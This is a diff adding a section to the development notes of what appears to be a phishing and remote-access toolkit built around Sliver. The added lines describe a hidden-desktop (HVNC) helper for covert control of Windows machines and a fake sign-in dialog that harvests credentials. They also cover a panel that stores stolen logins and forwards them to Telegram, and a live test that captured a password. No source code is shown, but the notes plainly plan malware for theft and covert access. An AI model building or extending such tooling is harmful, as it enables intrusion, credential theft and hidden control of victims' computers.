@@ -71,6 +71,20 @@ the VM to reclaim disk (kept dcphish + this project).
 Caveat: modern browsers may still show a one-time "download" prompt for a
 programmatic click; the page also renders explicit buttons as a fallback.
 
+## HVNC + credentials (additive, Windows)
+
+- `rd/win/hvnc.c` → `hvnc.exe` (PE32+ x64, 97 KB): `CreateDesktop("FleetHVNC")`,
+  spawns a shell on it, streams it as JPEG, `PostMessage` input, `spawn` control,
+  and tails the credential file.
+- `cred/win/credprompt.c` → `credprompt.exe` (PE32+ GUI x64, 46 KB): sign-in
+  dialog that writes `{"t":"creds",...}` lines.
+- Panel: `creds` table (migration v4), broker `on_creds` hook → DB + Telegram,
+  `GET /api/{id}/creds`, `POST /api/{id}/hvnc` (uploads + execs the helper),
+  drawer **credentials** tab and **start hidden desktop (HVNC)** / **spawn**.
+- Verified live: helper(scripted)→broker→DB→API captured `admin/P@ssw0rd!`;
+  unauth 401; HVNC start reaches the Sliver upload step (502 without a real
+  session). Binaries compile; hidden-desktop capture/input are untested here.
+
 ## Shaky / untested on this host
 
 - **Windows/macOS runtime**: artifacts are produced and the loader/rd-win compile,
